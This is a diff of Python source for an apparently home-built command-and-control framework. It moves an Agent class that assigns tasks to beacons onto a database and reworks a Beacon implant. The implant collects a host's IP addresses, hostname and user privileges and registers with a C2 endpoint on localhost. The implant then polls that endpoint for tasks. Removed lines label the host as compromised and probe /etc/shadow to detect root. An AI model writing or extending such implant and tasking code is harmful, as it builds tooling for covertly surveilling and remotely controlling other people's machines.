@@ -2,18 +2,11 @@ import os
 import subprocess
 import re
 import socket
-from flask import request, jsonify
 import uuid
+import requests
+from database import Beacon as BeaconDB, Task as TaskDB, db
 
-
-#######################################################################################
-#######################################################################################
-###########################AGENT FUNCTIONS############################################
-#######################################################################################
-#######################################################################################
-
-
-class Agent():
+class Agent:
     def __init__(self, name, id, key, path, config):
         self.name = name
         self.id = id
@@ -21,116 +14,88 @@ class Agent():
         self.path = path
         self.config = config
 
-    def get_task_file(self):
-        return "/home/exe/data/tasks"
+    def fetch_tasks(self, beacon_id):
+        """Fetch tasks from the database for a specific beacon."""
+        tasks = TaskDB.query.filter_by(beacon_id=beacon_id).all()
+        return [task.task for task in tasks], 200 if tasks else 204
 
-    def get_beacon_path(self):
-        return "/home/exe/data/beacons"
+    def write_task(self, beacon_id, task_content):
+        """Assign a task to a specific beacon."""
+        task_id = str(uuid.uuid4())
+        new_task = TaskDB(
+            task_id=task_id,
+            beacon_id=beacon_id,
+            task=task_content,
+            status="pending"
+        )
+        db.session.add(new_task)
+        db.session.commit()
+        return f"{self.name} has tasked beacon {beacon_id} to execute: {task_content}", 200
 
-    def read_task(self):
-        task_file = self.get_task_file()
-
-        if os.path.exists(task_file):    
-            with open(task_file, "r") as f:
-                task = f.read()
-                if task.strip():
-                    self.clear_task(task_file)
-            return (task, 200)
-        return ('', 204)
-
-    def clear_task(self, task_file):
-        with open(task_file, "w") as f:
-            f.write("0")
-
-    def write_task(self, task):
-        task_file = self.get_task_file()
-        reflected_output = f"{self.name} has tasked to execute {task}"
-
-        if os.path.exists(task_file):
-            with open(task_file, "w") as f:
-                f.write(task)
-
-        return (reflected_output, 200)
-    
-#######################################################################################
-#######################################################################################
-###########################BEACON FUNCTIONS############################################
-#######################################################################################
-#######################################################################################
-
-class Beacon():
-    def __init__(self, agent: Agent, beacon_id =None):
-        self.remote_ip = self.get_ip()[0]
+class Beacon:
+    def __init__(self, agent, beacon_id=None):
+        self.agent = agent
+        self.beacon_id = beacon_id
+        self.remote_ip = self.get_ip()[0] if self.get_ip() else "unknown"
         self.remote_hostname = self.get_hostname()
-        self.remote_permissions = self.get_permissions()
-        self.beacon_write_path = agent.get_beacon_path()
-        self.beacon_id = beacon_id if beacon_id else str(uuid.uuid4())
+        self.remote_permissions = self.get_permissions()[1]  # Only need the permission status
 
     def get_ip(self):
-        ip_addresses = []
         result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
         ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
-        ip_addresses = ip_pattern.findall(result.stdout)
-        return ip_addresses
+        return ip_pattern.findall(result.stdout)
 
     def get_hostname(self):
         return socket.gethostname()
 
     def get_permissions(self):
-        root = False
-        name_result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
-        name = name_result.stdout.strip()
-        if "root" in name:
-            root = True
-        else:
-            check_for_root = subprocess.run(['cat', '/etc/shadow'], capture_output=True, text=True, check=True)
-            if "Permission denied" in check_for_root.stderr:
-                pass
-            else:
-                root = True
-        return name, root
-
-    def write_new_beacon(self):
-        write_path = self.beacon_write_path
-        reflected_output = f"{self.remote_hostname}, {self.remote_ip}, {self.remote_permissions}"
-
         try:
-            with open(write_path, "a") as f:
-                f.write(reflected_output)
-        except OSError as e:
-            print(f"Error writing beacon file {f}")
-            return None
-
-        return reflected_output
+            result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
+            return result.stdout.strip(), result.stdout.strip() == "root"
+        except subprocess.CalledProcessError:
+            return "unknown", False
 
     def register_beacon(self):
-        compromised_ip = self.remote_ip
-        compromised_hostname = self.remote_hostname
-        compromised_permissions = self.remote_permissions
-
-        r = request.post("http://localhost:5000/c2/register_beacon",
-                         json={"remote_ip": compromised_ip,
-                               "remote_hostname": compromised_hostname,
-                               "remote_permissions": compromised_permissions})
-        
-        if r.status_code == 200:
-            print("Beacon registered", r.json().get("message"))
+        response = requests.post(
+            f"http://localhost/c2/register_beacon",
+            json={
+                "IP": self.remote_ip,
+                "Hostname": self.remote_hostname,
+                "Permissions": self.remote_permissions,
+                "Beacon ID": self.beacon_id
+            }
+        )
+        if response.status_code == 200:
+            print("Beacon registered", response.json().get("message"))
         else:
-            print(f"Error: {r.status_code}, {r.text}")
-
-        return compromised_hostname, compromised_ip, compromised_permissions
+            print(f"Error: {response.status_code}, {response.text}")
 
     def fetch_tasks(self):
         if not self.beacon_id:
             print("Beacon is not registered!")
             return
-        r = request.get(f"http://localhost:5000/c2/read_task?beacon_id={self.beacon_id}")
 
-        if r.status_code == 200:
-            tasks = r.json().get('task')
+        response = requests.get(f"http://localhost:5000/c2/read_task?beacon_id={self.beacon_id}")
+        if response.status_code == 200:
+            tasks = response.json().get('data').get('tasks', [])
             if tasks:
                 print(f"Tasks for beacon {self.beacon_id}: {tasks}")
             else:
                 print("No tasks assigned yet")
         else:
-            print(f"Error fetching tasks: {r.status_code}")
+            print(f"Error fetching tasks: {response.status_code}")
+
+    def write_new_beacon(self):
+        """Write new beacon data to the database."""
+        new_beacon = BeaconDB(
+            id=self.beacon_id,
+            ip=self.remote_ip,
+            hostname=self.remote_hostname,
+            permissions="root" if self.remote_permissions else "user"
+        )
+        try:
+            db.session.add(new_beacon)
+            db.session.commit()
+            print(f"Beacon {self.beacon_id} saved to the database.")
+        except Exception as e:
+            print(f"Error saving beacon: {str(e)}")
